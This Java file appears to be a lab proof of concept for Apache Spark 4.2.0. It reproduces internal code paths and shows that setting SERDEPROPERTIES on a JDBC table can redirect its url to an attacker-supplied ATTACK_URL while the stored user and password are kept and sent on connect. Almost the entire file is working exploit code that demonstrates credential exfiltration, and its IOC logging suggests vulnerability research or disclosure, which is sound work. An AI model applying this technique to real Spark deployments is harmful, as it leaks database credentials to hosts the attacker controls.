import java.sql.Connection;
import java.sql.Driver;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.Map;
import java.util.Properties;
import java.util.Set;

/**
 * Gadget of Spark 4.2.0 JDBC option reuse after ALTER TABLE SET SERDEPROPERTIES.
 *
 * <p>Pin: tag v4.2.0 commit 32f7299601108917fb01920a54e084595b7b3bf8
 *
 * <ul>
 *   <li>{@code DataSource.buildStorageFormatFromOptions} stores CREATE OPTIONS except path.
 *   <li>{@code AlterTableSerDePropertiesCommand} merges {@code storage.properties ++ serdeProperties}.
 *   <li>{@code AlterTableSetPropertiesCommand} writes {@code table.properties} only.
 *   <li>{@code DataSourceUtils.generateDatasourceOptions} refuses a different scan-time url
 *       (SPARK-31710).
 *   <li>{@code JDBCOptions.asConnectionProperties} keeps user/password; {@code
 *       BasicConnectionProvider.getConnection} calls {@code Driver.connect(url, properties)}.
 * </ul>
 */
public final class SerdeJdbcGadget {

  /**
   * Spark-internal JDBC option names from JDBCOptions.scala. These are stripped before
   * Driver.connect. user and password are not in this set.
   */
  private static final Set<String> JDBC_OPTION_NAMES =
      Set.of(
          "url",
          "dbtable",
          "query",
          "driver",
          "partitioncolumn",
          "lowerbound",
          "upperbound",
          "numpartitions",
          "querytimeout",
          "fetchsize",
          "truncate",
          "cascadetruncate",
          "createtableoptions",
          "createtablecolumntypes",
          "customschema",
          "batchsize",
          "isolationlevel",
          "sessioninitstatement",
          "pushdownpredicate",
          "pushdownaggregate",
          "pushdownlimit",
          "pushdownoffset",
          "pushdowntablesample",
          "pushdownjoin",
          "keytab",
          "principal",
          "tablecomment",
          "refreshkrb5config",
          "connectionprovider",
          "preparequery",
          "prefertimestampntz",
          "hint");

  private SerdeJdbcGadget() {}

  public static void main(String[] args) throws Exception {
    String mode = env("LAB_MODE");
    String storedUrl = env("STORED_URL");
    String attackUrl = env("ATTACK_URL");
    String user = env("JDBC_USER");
    String password = env("JDBC_PASSWORD");
    String dbtable = env("JDBC_DBTABLE");

    Map<String, String> createOptions = new LinkedHashMap<>();
    createOptions.put("url", storedUrl);
    createOptions.put("user", user);
    createOptions.put("password", password);
    createOptions.put("dbtable", dbtable);
    createOptions.put("driver", "org.postgresql.Driver");

    Map<String, String> storage = buildStorageFormatFromOptions(createOptions);
    ioc("create-storage=" + redact(storage));

    switch (mode) {
      case "extra-options" -> runExtraOptions(storage, attackUrl);
      case "tblproperties" -> runTblProperties(storage, attackUrl);
      case "serde" -> runSerde(storage, attackUrl);
      default -> {
        System.out.println("IOC unknown-mode=" + mode);
        System.exit(2);
      }
    }
  }

  /** DataSource.scala:866-871 - path is location; remaining keys become storage.properties. */
  static Map<String, String> buildStorageFormatFromOptions(Map<String, String> options) {
    Map<String, String> storage = new LinkedHashMap<>();
    for (Map.Entry<String, String> entry : options.entrySet()) {
      if (!"path".equalsIgnoreCase(entry.getKey())) {
        storage.put(entry.getKey(), entry.getValue());
      }
    }
    return storage;
  }

  /** ddl.scala:523-525 - storage.properties ++ serdeProperties (later keys win). */
  static Map<String, String> setSerdeProperties(
      Map<String, String> storage, Map<String, String> serdeProperties) {
    Map<String, String> merged = new LinkedHashMap<>(storage);
    merged.putAll(serdeProperties);
    return merged;
  }

  /** ddl.scala:329-331 - CatalogTable.properties only; storage.properties unchanged. */
  static Map<String, String> setTblProperties(
      Map<String, String> tableProperties, Map<String, String> incoming) {
    Map<String, String> merged = new LinkedHashMap<>(tableProperties);
    merged.putAll(incoming);
    return merged;
  }

  /**
   * DataSourceUtils.scala:292-310 - extra scan options cannot change an existing serde key
   * (SPARK-31710). Default spark.sql.legacy.extraOptionsBehavior.enabled=false.
   */
  static Map<String, String> generateDatasourceOptions(
      Map<String, String> extraOptions, Map<String, String> storage) {
    for (Map.Entry<String, String> entry : storage.entrySet()) {
      String extra = lookupIgnoreCase(extraOptions, entry.getKey());
      if (extra != null && !extra.equals(entry.getValue())) {
        throw new IllegalArgumentException(
            "SPARK-31710 extra-options clash on " + entry.getKey());
      }
    }
    Map<String, String> filteredExtra = new LinkedHashMap<>();
    for (Map.Entry<String, String> entry : extraOptions.entrySet()) {
      if (lookupIgnoreCase(storage, entry.getKey()) == null) {
        filteredExtra.put(entry.getKey(), entry.getValue());
      }
    }
    Map<String, String> options = new LinkedHashMap<>(filteredExtra);
    options.putAll(storage);
    return options;
  }

  /** JDBCOptions.scala:73-78 - non-Spark keys, including user/password, go to Driver.connect. */
  static Properties asConnectionProperties(Map<String, String> parameters) {
    Properties properties = new Properties();
    for (Map.Entry<String, String> entry : parameters.entrySet()) {
      if (!JDBC_OPTION_NAMES.contains(entry.getKey().toLowerCase(Locale.ROOT))) {
        properties.setProperty(entry.getKey(), entry.getValue());
      }
    }
    return properties;
  }

  /** BasicConnectionProvider.scala:42-50. */
  static void driverConnect(Map<String, String> parameters) throws Exception {
    String url = lookupIgnoreCase(parameters, "url");
    if (url == null) {
      throw new IllegalArgumentException("Option 'url' is required.");
    }
    Properties properties = asConnectionProperties(parameters);
    properties.setProperty("loginTimeout", "8");
    properties.setProperty("connectTimeout", "8");
    properties.setProperty("socketTimeout", "8");
    ioc("connect-url=" + url);
    ioc("connect-props=" + redactProps(properties));
    Driver driver = new org.postgresql.Driver();
    try (Connection ignored = driver.connect(url, properties)) {
      ioc("driver-connect=returned");
    }
  }

  private static void runExtraOptions(Map<String, String> storage, String attackUrl) {
    Map<String, String> extra = Map.of("url", attackUrl);
    try {
      Map<String, String> scan = generateDatasourceOptions(extra, storage);
      ioc("extra-options-scan=" + redact(scan));
      System.out.println("IOC extra-options-clash=missed");
      System.exit(2);
    } catch (IllegalArgumentException ex) {
      ioc("extra-options-clash=" + ex.getMessage());
    }
  }

  private static void runTblProperties(Map<String, String> storage, String attackUrl)
      throws Exception {
    Map<String, String> tableProperties = setTblProperties(Map.of(), Map.of("url", attackUrl));
    ioc("tblproperties=" + redact(tableProperties));
    String storageUrl = lookupIgnoreCase(storage, "url");
    String tableUrl = lookupIgnoreCase(tableProperties, "url");
    if (storageUrl != null && storageUrl.equals(tableUrl)) {
      System.out.println("IOC tblproperties-storage-url-unchanged=no");
      System.exit(2);
    }
    ioc("tblproperties-storage-url-unchanged=yes");
    Map<String, String> scan = generateDatasourceOptions(Map.of(), storage);
    try {
      driverConnect(scan);
      ioc("tblproperties-connected-stored=yes");
    } catch (Exception ex) {
      ioc("tblproperties-stored-connect-error=" + clip(ex.getMessage()));
    }
  }

  private static void runSerde(Map<String, String> storage, String attackUrl) throws Exception {
    Map<String, String> serde = Map.of("url", attackUrl);
    Map<String, String> merged = setSerdeProperties(storage, serde);
    ioc("serde-merged=" + redact(merged));
    String mergedUrl = lookupIgnoreCase(merged, "url");
    String storedUrl = lookupIgnoreCase(storage, "url");
    String storedUser = lookupIgnoreCase(storage, "user");
    String mergedUser = lookupIgnoreCase(merged, "user");
    if (mergedUrl == null || mergedUrl.equals(storedUrl)) {
      System.out.println("IOC serde-url-unchanged");
      System.exit(2);
    }
    if (storedUser == null || !storedUser.equals(mergedUser)) {
      System.out.println("IOC serde-user-not-reused");
      System.exit(2);
    }
    ioc("serde-url-replaced=yes");
    ioc("serde-user-kept=yes");
    Map<String, String> scan = generateDatasourceOptions(Map.of(), merged);
    try {
      driverConnect(scan);
    } catch (Exception ex) {
      ioc("serde-connect-error=" + clip(ex.getMessage()));
    }
  }

  private static String env(String name) {
    String value = System.getenv(name);
    if (value == null || value.isEmpty()) {
      throw new IllegalArgumentException("missing env " + name);
    }
    return value;
  }

  private static String lookupIgnoreCase(Map<String, String> map, String key) {
    for (Map.Entry<String, String> entry : map.entrySet()) {
      if (entry.getKey().equalsIgnoreCase(key)) {
        return entry.getValue();
      }
    }
    return null;
  }

  private static Map<String, String> redact(Map<String, String> map) {
    Map<String, String> out = new LinkedHashMap<>();
    for (Map.Entry<String, String> entry : map.entrySet()) {
      if ("password".equalsIgnoreCase(entry.getKey())) {
        out.put(entry.getKey(), "***");
      } else {
        out.put(entry.getKey(), entry.getValue());
      }
    }
    return out;
  }

  private static String redactProps(Properties properties) {
    Map<String, String> map = new LinkedHashMap<>();
    for (String name : properties.stringPropertyNames()) {
      map.put(name, properties.getProperty(name));
    }
    return redact(map).toString();
  }

  private static String clip(String text) {
    if (text == null) {
      return "";
    }
    String compact = text.replace('\n', ' ').replace('\r', ' ');
    return compact.length() > 200 ? compact.substring(0, 200) : compact;
  }

  private static void ioc(String msg) {
    System.out.println("IOC " + msg);
  }
}
